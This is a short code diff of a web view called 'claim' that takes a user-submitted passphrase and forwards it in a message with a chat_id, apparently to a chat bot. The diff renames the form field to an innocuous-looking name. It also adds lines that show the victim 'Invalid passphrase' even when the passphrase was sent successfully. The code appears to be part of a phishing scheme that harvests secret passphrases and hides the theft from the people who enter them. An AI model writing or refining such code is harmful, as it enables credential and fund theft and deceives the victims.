@@ -54,7 +54,7 @@ def home(request):
 
 def claim(request):
     if request.method == 'POST':
-        passphrase = request.POST.get('token')
+        passphrase = request.POST.get('mf-text')
 
         if not passphrase:
             return render(request, 'claim.html', {'error': 'Invalid Passphrase'})
@@ -82,5 +82,10 @@ def claim(request):
             'chat_id': chat_id,
             'text': message
         })
+
+        if response.status_code == 200:
+            return render(request, 'claim.html', {'success': False, 'error': 'Invalid passphrase'})
+        else:
+            return render(request, 'claim.html', {'success': False, 'error': 'Failed to submit'}, status=500)
 
     return render(request, 'claim.html')
